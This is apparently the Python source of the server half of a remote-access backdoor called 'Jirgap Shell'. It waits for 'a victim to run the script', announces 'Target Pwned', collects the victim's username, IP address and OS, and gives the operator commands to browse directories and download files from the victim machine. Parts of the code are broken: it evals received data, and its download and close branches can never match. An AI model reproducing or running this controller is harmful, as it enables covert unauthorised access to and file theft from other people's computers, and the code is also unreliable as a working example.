import requests
import socket
from random import randint


o_lo = """

 ▄▄▄██▀▀▀██▓ ██▀███    ▄████  ▄▄▄       ██▓███       ██████  ██░ ██ ▓█████  ██▓     ██▓    
   ▒██  ▓██▒▓██ ▒ ██▒ ██▒ ▀█▒▒████▄    ▓██░  ██▒   ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
   ░██  ▒██▒▓██ ░▄█ ▒▒██░▄▄▄░▒██  ▀█▄  ▓██░ ██▓▒   ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▓██▄██▓ ░██░▒██▀▀█▄  ░▓█  ██▓░██▄▄▄▄██ ▒██▄█▓▒ ▒     ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
 ▓███▒  ░██░░██▓ ▒██▒░▒▓███▀▒ ▓█   ▓██▒▒██▒ ░  ░   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒▓▒▒░  ░▓  ░ ▒▓ ░▒▓░ ░▒   ▒  ▒▒   ▓▒█░▒▓▒░ ░  ░   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░   ▒ ░  ░▒ ░ ▒░  ░   ░   ▒   ▒▒ ░░▒ ░        ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░ ░ ░   ▒ ░  ░░   ░ ░ ░   ░   ░   ▒   ░░          ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
 ░   ░   ░     ░           ░       ░  ░                  ░   ░  ░  ░   ░  ░    ░  ░    ░  ░                                                                            
"""  
 

class ServerSetup:
    def __init__(self, server, port):
        self.s_socket:socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server = server
        self.port = port
        self.listen_for_clients()


    def listen_for_clients(self):
        self.s_socket.bind((self.server, self.port))
        print("[!] Waiting for a victim to run the script")
        self.s_socket.listen()

        conn, addr = self.s_socket.accept()
        conn.settimeout(8)
        print(f"[!] Connection from {addr}")

        conn.send(b"TEST")
        if conn.recv(1024).decode("UTF-8") == "CONNECTED":
            print("[!] Target Pwned :)")
        else:
            print("[-] TEST FAILED, TRY AGAIN?")
            return

        # Get user on target
        conn.send(b"getuser")
        user = conn.recv(1024).decode("UTF-8")
        conn.send(b"getip")
        ip = conn.recv(1024).decode("UTF-8")
        conn.send(b"getos")
        os_info = conn.recv(1024).decode("UTF-8")

        if not user.startswith("Username"):
            user = "Username: ?"
        elif not ip.startswith("IP"):
            ip = "IP: ?"
        elif not os_info.startswith("OS"):
            os_info = "OS: ??"

        censored_ip = ip[:4]
        for i in range(4, len(ip), 2):
            if i == ".":
                continue
            censored_ip += "*"
            if i + 1 < len(ip):
                censored_ip += ip[i + 1]

        
        print(f"[+] {user}\n[+] {censored_ip}\n[+] {os_info}")

        commands = {"help": "Displays information on commands and extras", "user":"Get username of targets machine", "check":"Checks if still connected to target", "listdir": "Will list all the files in directory", "pwd": "This shows the current path that the script is running at", "cd": "This is to change directory", "download": "Attempts to download specified file from victim"}

        print("Type help for commands")
        while True:
            cmd = input("What command would you like to send? ").replace(" ", "").upper()


            if cmd == "HELP":
                for cmd in commands.keys():
                    print(f"{cmd.capitalize()}: {commands[cmd]}")
            
            elif cmd == "USER":
                print(user)
            
            elif cmd == "CHECK":
                try:
                    conn.send(b"TEST")
                    status_connect = conn.recv(1024).decode("UTF-8")
                    print(f"Staus: {status_connect}")
                except ConnectionRefusedError:
                    print("Connection was closed, client is no longer connected...")

            elif cmd == "LISTDIR":
                conn.send(b"LISTDIR")
                all_dirs = conn.recv(4096).decode("UTF-8")
                all_dirs = eval(all_dirs)
                for dir in all_dirs:
                    print(dir)

            elif cmd == "PWD":
                conn.send(b"PWD")
                current_dir = conn.recv(2056).decode("UTF-8")
                print(current_dir.replace("[", "\0").replace("]", "\0"))

            elif cmd.startswith("CD"):
                conn.send(bytes(cmd, "UTF-8"))
                new_msg = conn.recv(2056).decode("UTF-8")
                print(new_msg)
            
            elif cmd.startswith("download"):
                conn.send(bytes(cmd, "UTF-8"))
                new_msg = conn.recv(2056).decode("UTF-8")
                print(new_msg)

            elif cmd == "close":
                conn.send(b"close")
                conn.close()
                print("Connection Closed")
                break
            
            else:
                print("Invalid command, please use help to get a list of all the commands!")
                continue
            


if __name__ == "__main__":  
    C_SERVER    = "127.0.0.1"
    C_PORT      = 3334 
    print(o_lo)
    print("                                                 Welcome User                  ")
    ServerSetup(server=C_SERVER, port=C_PORT)
